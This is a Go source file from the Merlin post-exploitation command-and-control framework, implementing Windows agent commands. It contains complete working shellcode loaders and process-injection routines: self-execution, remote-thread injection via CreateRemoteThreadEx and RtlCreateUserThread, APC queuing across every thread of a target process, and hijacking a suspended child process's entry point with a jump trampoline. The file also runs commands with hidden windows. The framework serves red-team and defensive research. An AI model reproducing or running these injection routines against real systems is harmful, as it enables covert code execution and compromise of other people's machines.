// +build windows

// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2021  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package commands

import (
	// Standard
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"errors"
	"fmt"
	"io/ioutil"
	"net"
	"os"
	"os/exec"
	"reflect"
	"syscall"
	"time"
	"unsafe"

	// Sub Repositories
	"golang.org/x/sys/windows"
)

const (
	// MEM_COMMIT is a Windows constant used with Windows API calls
	MEM_COMMIT = 0x1000
	// MEM_RESERVE is a Windows constant used with Windows API calls
	MEM_RESERVE = 0x2000
	// MEM_RELEASE is a Windows constant used with Windows API calls
	MEM_RELEASE = 0x8000
	// PAGE_EXECUTE is a Windows constant used with Windows API calls
	PAGE_EXECUTE = 0x10
	// PAGE_EXECUTE_READWRITE is a Windows constant used with Windows API calls
	PAGE_EXECUTE_READWRITE = 0x40
	// PAGE_READWRITE is a Windows constant used with Windows API calls
	PAGE_READWRITE = 0x04
	// PROCESS_CREATE_THREAD is a Windows constant used with Windows API calls
	PROCESS_CREATE_THREAD = 0x0002
	// PROCESS_VM_READ is a Windows constant used with Windows API calls
	PROCESS_VM_READ = 0x0010
	//PROCESS_VM_WRITE is a Windows constant used with Windows API calls
	PROCESS_VM_WRITE = 0x0020
	// PROCESS_VM_OPERATION is a Windows constant used with Windows API calls
	PROCESS_VM_OPERATION = 0x0008
	// PROCESS_QUERY_INFORMATION is a Windows constant used with Windows API calls
	PROCESS_QUERY_INFORMATION = 0x0400
	// TH32CS_SNAPHEAPLIST is a Windows constant used with Windows API calls
	TH32CS_SNAPHEAPLIST = 0x00000001
	// TH32CS_SNAPMODULE is a Windows constant used with Windows API calls
	TH32CS_SNAPMODULE = 0x00000008
	// TH32CS_SNAPPROCESS is a Windows constant used with Windows API calls
	TH32CS_SNAPPROCESS = 0x00000002
	// TH32CS_SNAPTHREAD is a Windows constant used with Windows API calls
	TH32CS_SNAPTHREAD = 0x00000004
	// THREAD_SET_CONTEXT is a Windows constant used with Windows API calls
	THREAD_SET_CONTEXT = 0x0010

	// The path for windows named pipes
	pipePrefix = `\\.\pipe\`
)

// executeCommand is function used to instruct an agent to execute a command on the host operating system
func executeCommand(name string, args []string) (stdout string, stderr string) {
	cmd := exec.Command(name, args...)

	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true} //Only difference between this and agent.go

	out, err := cmd.CombinedOutput()
	stdout = string(out)
	stderr = ""

	if err != nil {
		stderr = err.Error()
	}

	return stdout, stderr
}

// ExecuteShellcodeSelf executes provided shellcode in the current process
func ExecuteShellcodeSelf(shellcode []byte) error {

	kernel32 := windows.NewLazySystemDLL("kernel32")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	//VirtualProtect := kernel32.NewProc("VirtualProtectEx")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")

	addr, _, errVirtualAlloc := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)

	if errVirtualAlloc.Error() != "The operation completed successfully." {
		return errors.New("Error calling VirtualAlloc:\r\n" + errVirtualAlloc.Error())
	}

	if addr == 0 {
		return errors.New("VirtualAlloc failed and returned 0")
	}

	_, _, errRtlCopyMemory := RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if errRtlCopyMemory.Error() != "The operation completed successfully." {
		return errors.New("Error calling RtlCopyMemory:\r\n" + errRtlCopyMemory.Error())
	}
	// TODO set initial memory allocation to rw and update to execute; currently getting "The parameter is incorrect."
	/*	_, _, errVirtualProtect := VirtualProtect.Call(uintptr(addr), uintptr(len(shellcode)), PAGE_EXECUTE)
		if errVirtualProtect.Error() != "The operation completed successfully." {
			return errVirtualProtect
		}*/

	_, _, errSyscall := syscall.Syscall(addr, 0, 0, 0, 0)

	if errSyscall != 0 {
		return errors.New("Error executing shellcode syscall:\r\n" + errSyscall.Error())
	}

	return nil
}

// ExecuteShellcodeRemote executes provided shellcode in the provided target process
func ExecuteShellcodeRemote(shellcode []byte, pid uint32) error {
	kernel32 := windows.NewLazySystemDLL("kernel32")

	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	CreateRemoteThreadEx := kernel32.NewProc("CreateRemoteThreadEx")
	CloseHandle := kernel32.NewProc("CloseHandle")

	pHandle, errOpenProcess := syscall.OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, false, pid)

	if errOpenProcess != nil {
		return errors.New("Error calling OpenProcess:\r\n" + errOpenProcess.Error())
	}

	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(pHandle), 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)

	if errVirtualAlloc.Error() != "The operation completed successfully." {
		return errors.New("Error calling VirtualAlloc:\r\n" + errVirtualAlloc.Error())
	}

	if addr == 0 {
		return errors.New("VirtualAllocEx failed and returned 0")
	}

	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(pHandle), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if errWriteProcessMemory.Error() != "The operation completed successfully." {
		return errors.New("Error calling WriteProcessMemory:\r\n" + errWriteProcessMemory.Error())
	}

	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(pHandle), addr, uintptr(len(shellcode)), PAGE_EXECUTE)
	if errVirtualProtectEx.Error() != "The operation completed successfully." {
		return errors.New("Error calling VirtualProtectEx:\r\n" + errVirtualProtectEx.Error())
	}

	_, _, errCreateRemoteThreadEx := CreateRemoteThreadEx.Call(uintptr(pHandle), 0, 0, addr, 0, 0, 0)
	if errCreateRemoteThreadEx.Error() != "The operation completed successfully." {
		return errors.New("Error calling CreateRemoteThreadEx:\r\n" + errCreateRemoteThreadEx.Error())
	}

	_, _, errCloseHandle := CloseHandle.Call(uintptr(pHandle))
	if errCloseHandle.Error() != "The operation completed successfully." {
		return errors.New("Error calling CloseHandle:\r\n" + errCloseHandle.Error())
	}

	return nil
}

// ExecuteShellcodeRtlCreateUserThread executes provided shellcode in the provided target process using the Windows RtlCreateUserThread call
func ExecuteShellcodeRtlCreateUserThread(shellcode []byte, pid uint32) error {
	kernel32 := windows.NewLazySystemDLL("kernel32")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	CloseHandle := kernel32.NewProc("CloseHandle")
	RtlCreateUserThread := ntdll.NewProc("RtlCreateUserThread")
	WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")

	pHandle, errOpenProcess := syscall.OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, false, pid)

	if errOpenProcess != nil {
		return errors.New("Error calling OpenProcess:\r\n" + errOpenProcess.Error())
	}

	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(pHandle), 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)

	if errVirtualAlloc.Error() != "The operation completed successfully." {
		return errors.New("Error calling VirtualAlloc:\r\n" + errVirtualAlloc.Error())
	}

	if addr == 0 {
		return errors.New("VirtualAllocEx failed and returned 0")
	}

	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(pHandle), addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if errWriteProcessMemory.Error() != "The operation completed successfully." {
		return errors.New("Error calling WriteProcessMemory:\r\n" + errWriteProcessMemory.Error())
	}

	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(pHandle), addr, uintptr(len(shellcode)), PAGE_EXECUTE)
	if errVirtualProtectEx.Error() != "The operation completed successfully." {
		return errors.New("Error calling VirtualProtectEx:\r\n" + errVirtualProtectEx.Error())
	}

	/*
		NTSTATUS
		RtlCreateUserThread(
			IN HANDLE Process,
			IN PSECURITY_DESCRIPTOR ThreadSecurityDescriptor OPTIONAL,
			IN BOOLEAN CreateSuspended,
			IN ULONG ZeroBits OPTIONAL,
			IN SIZE_T MaximumStackSize OPTIONAL,
			IN SIZE_T CommittedStackSize OPTIONAL,
			IN PUSER_THREAD_START_ROUTINE StartAddress,
			IN PVOID Parameter OPTIONAL,
			OUT PHANDLE Thread OPTIONAL,
			OUT PCLIENT_ID ClientId OPTIONAL
			)
	*/
	var tHandle uintptr
	_, _, errRtlCreateUserThread := RtlCreateUserThread.Call(uintptr(pHandle), 0, 0, 0, 0, 0, addr, 0, uintptr(unsafe.Pointer(&tHandle)), 0)

	if errRtlCreateUserThread.Error() != "The operation completed successfully." {
		return errors.New("Error calling RtlCreateUserThread:\r\n" + errRtlCreateUserThread.Error())
	}

	_, _, errWaitForSingleObject := WaitForSingleObject.Call(tHandle, syscall.INFINITE)
	if errWaitForSingleObject.Error() != "The operation completed successfully." {
		return errors.New("Error calling WaitForSingleObject:\r\n" + errWaitForSingleObject.Error())
	}

	_, _, errCloseHandle := CloseHandle.Call(uintptr(pHandle))
	if errCloseHandle.Error() != "The operation completed successfully." {
		return errors.New("Error calling CloseHandle:\r\n" + errCloseHandle.Error())
	}

	return nil
}

// ExecuteShellcodeQueueUserAPC executes provided shellcode in the provided target process using the Windows QueueUserAPC API call
func ExecuteShellcodeQueueUserAPC(shellcode []byte, pid uint32) error {
	// TODO this can be local or remote
	kernel32 := windows.NewLazySystemDLL("kernel32")

	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	CloseHandle := kernel32.NewProc("CloseHandle")
	CreateToolhelp32Snapshot := kernel32.NewProc("CreateToolhelp32Snapshot")
	QueueUserAPC := kernel32.NewProc("QueueUserAPC")
	Thread32First := kernel32.NewProc("Thread32First")
	Thread32Next := kernel32.NewProc("Thread32Next")
	OpenThread := kernel32.NewProc("OpenThread")

	// Consider using NtQuerySystemInformation to replace CreateToolhelp32Snapshot AND to find a thread in a wait state
	// https://stackoverflow.com/questions/22949725/how-to-get-thread-state-e-g-suspended-memory-cpu-usage-start-time-priori

	pHandle, errOpenProcess := syscall.OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, false, pid)

	if errOpenProcess != nil {
		return errors.New("Error calling OpenProcess:\r\n" + errOpenProcess.Error())
	}
	// TODO see if you can use just SNAPTHREAD
	sHandle, _, errCreateToolhelp32Snapshot := CreateToolhelp32Snapshot.Call(TH32CS_SNAPHEAPLIST|TH32CS_SNAPMODULE|TH32CS_SNAPPROCESS|TH32CS_SNAPTHREAD, uintptr(pid))
	if errCreateToolhelp32Snapshot.Error() != "The operation completed successfully." {
		return errors.New("Error calling CreateToolhelp32Snapshot:\r\n" + errCreateToolhelp32Snapshot.Error())
	}

	// TODO don't allocate/write memory unless there is a valid thread
	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(pHandle), 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)

	if errVirtualAlloc.Error() != "The operation completed successfully." {
		return errors.New("Error calling VirtualAlloc:\r\n" + errVirtualAlloc.Error())
	}

	if addr == 0 {
		return errors.New("VirtualAllocEx failed and returned 0")
	}

	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(pHandle), addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if errWriteProcessMemory.Error() != "The operation completed successfully." {
		return errors.New("Error calling WriteProcessMemory:\r\n" + errWriteProcessMemory.Error())
	}

	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(pHandle), addr, uintptr(len(shellcode)), PAGE_EXECUTE)
	if errVirtualProtectEx.Error() != "The operation completed successfully." {
		return errors.New("Error calling VirtualProtectEx:\r\n" + errVirtualProtectEx.Error())
	}

	type THREADENTRY32 struct {
		dwSize             uint32
		cntUsage           uint32
		th32ThreadID       uint32
		th32OwnerProcessID uint32
		tpBasePri          int32
		tpDeltaPri         int32
		dwFlags            uint32
	}
	var t THREADENTRY32
	t.dwSize = uint32(unsafe.Sizeof(t))

	_, _, errThread32First := Thread32First.Call(uintptr(sHandle), uintptr(unsafe.Pointer(&t)))
	if errThread32First.Error() != "The operation completed successfully." {
		return errors.New("Error calling Thread32First:\r\n" + errThread32First.Error())
	}
	i := true
	x := 0
	// Queue an APC for every thread; very unstable and not ideal, need to programmatically find alertable thread
	for i {
		_, _, errThread32Next := Thread32Next.Call(uintptr(sHandle), uintptr(unsafe.Pointer(&t)))
		if errThread32Next.Error() == "There are no more files." {
			if x == 1 {
				// don't queue to main thread when using the "spray all threads" technique
				// often crashes process
				return errors.New("the process only has 1 thread; APC not queued")
			}
			i = false
			break
		} else if errThread32Next.Error() != "The operation completed successfully." {
			return errors.New("Error calling Thread32Next:\r\n" + errThread32Next.Error())
		}
		if t.th32OwnerProcessID == pid {
			if x > 0 {
				tHandle, _, errOpenThread := OpenThread.Call(THREAD_SET_CONTEXT, 0, uintptr(t.th32ThreadID))
				if errOpenThread.Error() != "The operation completed successfully." {
					return errors.New("Error calling OpenThread:\r\n" + errOpenThread.Error())
				}
				// fmt.Println(fmt.Sprintf("Queueing APC for PID: %d, Thread %d", pid, t.th32ThreadID))
				_, _, errQueueUserAPC := QueueUserAPC.Call(addr, tHandle, 0)
				if errQueueUserAPC.Error() != "The operation completed successfully." {
					return errors.New("Error calling QueueUserAPC:\r\n" + errQueueUserAPC.Error())
				}
				x++
				_, _, errCloseHandle := CloseHandle.Call(tHandle)
				if errCloseHandle.Error() != "The operation completed successfully." {
					return errors.New("Error calling thread CloseHandle:\r\n" + errCloseHandle.Error())
				}
			} else {
				x++
			}
		}

	}
	// TODO check process to make sure it didn't crash
	_, _, errCloseHandle := CloseHandle.Call(uintptr(pHandle))
	if errCloseHandle.Error() != "The operation completed successfully." {
		return errors.New("Error calling CloseHandle:\r\n" + errCloseHandle.Error())
	}

	return nil
}

// ExecuteShellcodeCreateProcessWithPipe creates a child process, redirects STDOUT/STDERR to an anonymous pipe, injects/executes shellcode, and retrieves output
// Returns STDOUT and STDERR from process execution. Any encountered errors in this function are also returned in STDERR
func ExecuteShellcodeCreateProcessWithPipe(sc string, spawnto string, args string) (stdout string, stderr string, err error) {
	// Base64 decode string  into bytes
	shellcode, errDecode := base64.StdEncoding.DecodeString(sc)
	if errDecode != nil {
		return stdout, stderr, fmt.Errorf("there  was an error decoding the Base64 string: %s", errDecode)
	}

	// Verify SpawnTo executable exists
	if _, err := os.Stat(spawnto); os.IsNotExist(err) {
		return stdout, stderr, fmt.Errorf("path does not exist: %s\r\n%s", spawnto, err)
	}

	// Load DLLs and Procedures
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	NtQueryInformationProcess := ntdll.NewProc("NtQueryInformationProcess")

	// Create anonymous pipe for STDIN
	// TODO I don't think I need this for anything
	var stdInRead windows.Handle
	var stdInWrite windows.Handle

	errStdInPipe := windows.CreatePipe(&stdInRead, &stdInWrite, &windows.SecurityAttributes{InheritHandle: 1}, 0)
	if errStdInPipe != nil {
		return stdout, stderr, fmt.Errorf("error creating the STDIN pipe:\r\n%s", errStdInPipe)
	}

	// Create anonymous pipe for STDOUT
	var stdOutRead windows.Handle
	var stdOutWrite windows.Handle
	errStdOutPipe := windows.CreatePipe(&stdOutRead, &stdOutWrite, &windows.SecurityAttributes{InheritHandle: 1}, 0)
	if errStdOutPipe != nil {
		return stdout, stderr, fmt.Errorf("error creating the STDOUT pipe:\r\n%s", errStdOutPipe)
	}

	// Create anonymous pipe for STDERR
	var stdErrRead windows.Handle
	var stdErrWrite windows.Handle
	errStdErrPipe := windows.CreatePipe(&stdErrRead, &stdErrWrite, &windows.SecurityAttributes{InheritHandle: 1}, 0)
	if errStdErrPipe != nil {
		return stdout, stderr, fmt.Errorf("error creating the STDERR pipe:\r\n%s", errStdErrPipe)
	}

	// Create child process in suspended state
	/*
		BOOL CreateProcessW(
		LPCWSTR               lpApplicationName,
		LPWSTR                lpCommandLine,
		LPSECURITY_ATTRIBUTES lpProcessAttributes,
		LPSECURITY_ATTRIBUTES lpThreadAttributes,
		BOOL                  bInheritHandles,
		DWORD                 dwCreationFlags,
		LPVOID                lpEnvironment,
		LPCWSTR               lpCurrentDirectory,
		LPSTARTUPINFOW        lpStartupInfo,
		LPPROCESS_INFORMATION lpProcessInformation
		);
	*/

	procInfo := &windows.ProcessInformation{}
	startupInfo := &windows.StartupInfo{
		StdInput:   stdInRead,
		StdOutput:  stdOutWrite,
		StdErr:     stdErrWrite,
		Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
		ShowWindow: 1,
	}
	errCreateProcess := windows.CreateProcess(syscall.StringToUTF16Ptr(spawnto), syscall.StringToUTF16Ptr(args), nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)
	if errCreateProcess != nil && errCreateProcess.Error() != "The operation completed successfully." {
		return stdout, stderr, fmt.Errorf("error calling CreateProcess:\r\n%s", errCreateProcess)
	}

	// Allocate memory in child process
	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)

	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		return stdout, stderr, fmt.Errorf("error calling VirtualAlloc:\r\n%s", errVirtualAlloc)
	}

	if addr == 0 {
		return stdout, stderr, fmt.Errorf("VirtualAllocEx failed and returned 0")
	}

	// Write shellcode into child process memory
	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(procInfo.Process), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed successfully." {
		return stdout, stderr, fmt.Errorf("error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory)
	}

	// Change memory permissions to RX in child process where shellcode was written
	oldProtect := windows.PAGE_READWRITE
	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(procInfo.Process), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
		return stdout, stderr, fmt.Errorf("error calling VirtualProtectEx:\r\n%s", errVirtualProtectEx)
	}

	var processInformation PROCESS_BASIC_INFORMATION
	var returnLength uintptr
	ntStatus, _, errNtQueryInformationProcess := NtQueryInformationProcess.Call(uintptr(procInfo.Process), 0, uintptr(unsafe.Pointer(&processInformation)), unsafe.Sizeof(processInformation), returnLength)
	if errNtQueryInformationProcess != nil && errNtQueryInformationProcess.Error() != "The operation completed successfully." {
		return stdout, stderr, fmt.Errorf("error calling NtQueryInformationProcess:\r\n\t%s", errNtQueryInformationProcess)
	}
	if ntStatus != 0 {
		if ntStatus == 3221225476 {
			return stdout, stderr, fmt.Errorf("error calling NtQueryInformationProcess: STATUS_INFO_LENGTH_MISMATCH") // 0xc0000004 (3221225476)
		}
		fmt.Println(fmt.Sprintf("[!]NtQueryInformationProcess returned NTSTATUS: %x(%d)", ntStatus, ntStatus))
		return stdout, stderr, fmt.Errorf("error calling NtQueryInformationProcess:\r\n\t%s", syscall.Errno(ntStatus))
	}

	// Read from PEB base address to populate the PEB structure
	// ReadProcessMemory
	/*
		BOOL ReadProcessMemory(
		HANDLE  hProcess,
		LPCVOID lpBaseAddress,
		LPVOID  lpBuffer,
		SIZE_T  nSize,
		SIZE_T  *lpNumberOfBytesRead
		);
	*/

	ReadProcessMemory := kernel32.NewProc("ReadProcessMemory")

	var peb PEB
	var readBytes int32

	_, _, errReadProcessMemory := ReadProcessMemory.Call(uintptr(procInfo.Process), processInformation.PebBaseAddress, uintptr(unsafe.Pointer(&peb)), unsafe.Sizeof(peb), uintptr(unsafe.Pointer(&readBytes)))
	if errReadProcessMemory != nil && errReadProcessMemory.Error() != "The operation completed successfully." {
		return stdout, stderr, fmt.Errorf("error calling ReadProcessMemory:\r\n\t%s", errReadProcessMemory)
	}

	var dosHeader IMAGE_DOS_HEADER
	var readBytes2 int32

	_, _, errReadProcessMemory2 := ReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress, uintptr(unsafe.Pointer(&dosHeader)), unsafe.Sizeof(dosHeader), uintptr(unsafe.Pointer(&readBytes2)))
	if errReadProcessMemory2 != nil && errReadProcessMemory2.Error() != "The operation completed successfully." {
		return stdout, stderr, fmt.Errorf("error calling ReadProcessMemory:\r\n\t%s", errReadProcessMemory2)
	}

	// 23117 is the LittleEndian unsigned base10 representation of MZ
	// 0x5a4d is the LittleEndian unsigned base16 representation of MZ
	if dosHeader.Magic != 23117 {
		return stdout, stderr, fmt.Errorf("DOS image header magic string was not MZ: 0x%x", dosHeader.Magic)
	}

	// Read the child process's PE header signature to validate it is a PE
	var Signature uint32
	var readBytes3 int32

	_, _, errReadProcessMemory3 := ReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress+uintptr(dosHeader.LfaNew), uintptr(unsafe.Pointer(&Signature)), unsafe.Sizeof(Signature), uintptr(unsafe.Pointer(&readBytes3)))
	if errReadProcessMemory3 != nil && errReadProcessMemory3.Error() != "The operation completed successfully." {
		return stdout, stderr, fmt.Errorf("error calling ReadProcessMemory:\r\n\t%s", errReadProcessMemory3)
	}

	// 17744 is Little Endian Unsigned 32-bit integer in decimal for PE (null terminated)
	// 0x4550 is Little Endian Unsigned 32-bit integer in hex for PE (null terminated)
	if Signature != 17744 {
		return stdout, stderr, fmt.Errorf("PE Signature string was not PE: 0x%x", Signature)
	}

	var peHeader IMAGE_FILE_HEADER
	var readBytes4 int32

	_, _, errReadProcessMemory4 := ReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature), uintptr(unsafe.Pointer(&peHeader)), unsafe.Sizeof(peHeader), uintptr(unsafe.Pointer(&readBytes4)))
	if errReadProcessMemory4 != nil && errReadProcessMemory4.Error() != "The operation completed successfully." {
		return stdout, stderr, fmt.Errorf("error calling ReadProcessMemory:\r\n\t%s", errReadProcessMemory4)
	}

	var optHeader64 IMAGE_OPTIONAL_HEADER64
	var optHeader32 IMAGE_OPTIONAL_HEADER32
	var errReadProcessMemory5 error
	var readBytes5 int32

	if peHeader.Machine == 34404 { // 0x8664
		_, _, errReadProcessMemory5 = ReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature)+unsafe.Sizeof(peHeader), uintptr(unsafe.Pointer(&optHeader64)), unsafe.Sizeof(optHeader64), uintptr(unsafe.Pointer(&readBytes5)))
	} else if peHeader.Machine == 332 { // 0x14c
		_, _, errReadProcessMemory5 = ReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature)+unsafe.Sizeof(peHeader), uintptr(unsafe.Pointer(&optHeader32)), unsafe.Sizeof(optHeader32), uintptr(unsafe.Pointer(&readBytes5)))
	} else {
		return stdout, stderr, fmt.Errorf("unknow IMAGE_OPTIONAL_HEADER type for machine type: 0x%x", peHeader.Machine)
	}

	if errReadProcessMemory5 != nil && errReadProcessMemory5.Error() != "The operation completed successfully." {
		return stdout, stderr, fmt.Errorf("error calling ReadProcessMemory:\r\n\t%s", errReadProcessMemory5)
	}

	// Overwrite the value at AddressofEntryPoint field with trampoline to load the shellcode address in RAX/EAX and jump to it
	var ep uintptr
	if peHeader.Machine == 34404 { // 0x8664 x64
		ep = peb.ImageBaseAddress + uintptr(optHeader64.AddressOfEntryPoint)
	} else if peHeader.Machine == 332 { // 0x14c x86
		ep = peb.ImageBaseAddress + uintptr(optHeader32.AddressOfEntryPoint)
	} else {
		return stdout, stderr, fmt.Errorf("unknow IMAGE_OPTIONAL_HEADER type for machine type: 0x%x", peHeader.Machine)
	}

	var epBuffer []byte
	var shellcodeAddressBuffer []byte
	// x86 - 0xb8 = mov eax
	// x64 - 0x48 = rex (declare 64bit); 0xb8 = mov eax
	if peHeader.Machine == 34404 { // 0x8664 x64
		epBuffer = append(epBuffer, byte(0x48))
		epBuffer = append(epBuffer, byte(0xb8))
		shellcodeAddressBuffer = make([]byte, 8) // 8 bytes for 64-bit address
		binary.LittleEndian.PutUint64(shellcodeAddressBuffer, uint64(addr))
		epBuffer = append(epBuffer, shellcodeAddressBuffer...)
	} else if peHeader.Machine == 332 { // 0x14c x86
		epBuffer = append(epBuffer, byte(0xb8))
		shellcodeAddressBuffer = make([]byte, 4) // 4 bytes for 32-bit address
		binary.LittleEndian.PutUint32(shellcodeAddressBuffer, uint32(addr))
		epBuffer = append(epBuffer, shellcodeAddressBuffer...)
	} else {
		return stdout, stderr, fmt.Errorf("unknow IMAGE_OPTIONAL_HEADER type for machine type: 0x%x", peHeader.Machine)
	}

	// 0xff ; 0xe0 = jmp [r|e]ax
	epBuffer = append(epBuffer, byte(0xff))
	epBuffer = append(epBuffer, byte(0xe0))

	_, _, errWriteProcessMemory2 := WriteProcessMemory.Call(uintptr(procInfo.Process), ep, uintptr(unsafe.Pointer(&epBuffer[0])), uintptr(len(epBuffer)))

	if errWriteProcessMemory2 != nil && errWriteProcessMemory2.Error() != "The operation completed successfully." {
		return stdout, stderr, fmt.Errorf("error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory2)
	}

	// Resume the child process
	_, errResumeThread := windows.ResumeThread(procInfo.Thread)
	if errResumeThread != nil {
		return stdout, stderr, fmt.Errorf("[!]Error calling ResumeThread:\r\n%s", errResumeThread)
	}

	// Close the handle to the child process
	errCloseProcHandle := windows.CloseHandle(procInfo.Process)
	if errCloseProcHandle != nil {
		return stdout, stderr, fmt.Errorf("error closing the child process handle:\r\n\t%s", errCloseProcHandle)
	}

	// Close the hand to the child process thread
	errCloseThreadHandle := windows.CloseHandle(procInfo.Thread)
	if errCloseThreadHandle != nil {
		return stdout, stderr, fmt.Errorf("error closing the child process thread handle:\r\n\t%s", errCloseThreadHandle)
	}

	// Close the write handle the anonymous STDOUT pipe
	errCloseStdOutWrite := windows.CloseHandle(stdOutWrite)
	if errCloseStdOutWrite != nil {
		return stdout, stderr, fmt.Errorf("error closing STDOUT pipe write handle:\r\n\t%s", errCloseStdOutWrite)
	}

	// Close the read handle to the anonymous STDIN pipe
	errCloseStdInRead := windows.CloseHandle(stdInRead)
	if errCloseStdInRead != nil {
		return stdout, stderr, fmt.Errorf("error closing the STDIN pipe read handle:\r\n\t%s", errCloseStdInRead)
	}

	// Close the write handle to the anonymous STDERR pipe
	errCloseStdErrWrite := windows.CloseHandle(stdErrWrite)
	if errCloseStdErrWrite != nil {
		return stdout, stderr, fmt.Errorf("[!]err closing STDERR pipe write handle:\r\n\t%s", errCloseStdErrWrite)
	}

	// Read STDOUT from child process
	/*
		BOOL ReadFile(
		HANDLE       hFile,
		LPVOID       lpBuffer,
		DWORD        nNumberOfBytesToRead,
		LPDWORD      lpNumberOfBytesRead,
		LPOVERLAPPED lpOverlapped
		);
	*/
	nNumberOfBytesToRead := make([]byte, 1)
	var stdOutBuffer []byte
	var stdOutDone uint32
	var stdOutOverlapped windows.Overlapped

	// ReadFile on STDOUT pipe
	for {
		errReadFileStdOut := windows.ReadFile(stdOutRead, nNumberOfBytesToRead, &stdOutDone, &stdOutOverlapped)
		if errReadFileStdOut != nil && errReadFileStdOut.Error() != "The pipe has been ended." {
			return stdout, stderr, fmt.Errorf("error reading from STDOUT pipe:\r\n\t%s", errReadFileStdOut)
		}
		if int(stdOutDone) == 0 {
			break
		}
		for _, b := range nNumberOfBytesToRead {
			stdOutBuffer = append(stdOutBuffer, b)
		}
	}

	// Read STDERR from child process
	var stdErrBuffer []byte
	var stdErrDone uint32
	var stdErrOverlapped windows.Overlapped

	for {
		errReadFileStdErr := windows.ReadFile(stdErrRead, nNumberOfBytesToRead, &stdErrDone, &stdErrOverlapped)
		if errReadFileStdErr != nil && errReadFileStdErr.Error() != "The pipe has been ended." {
			return stdout, stderr, fmt.Errorf("error reading from STDOUT pipe:\r\n\t%s", errReadFileStdErr)
		}
		if int(stdErrDone) == 0 {
			break
		}
		for _, b := range nNumberOfBytesToRead {
			stdErrBuffer = append(stdErrBuffer, b)
		}
	}

	// Write the data collected from the child process' STDOUT to the parent process' STDOUT
	return string(stdOutBuffer), string(stdErrBuffer), err
}

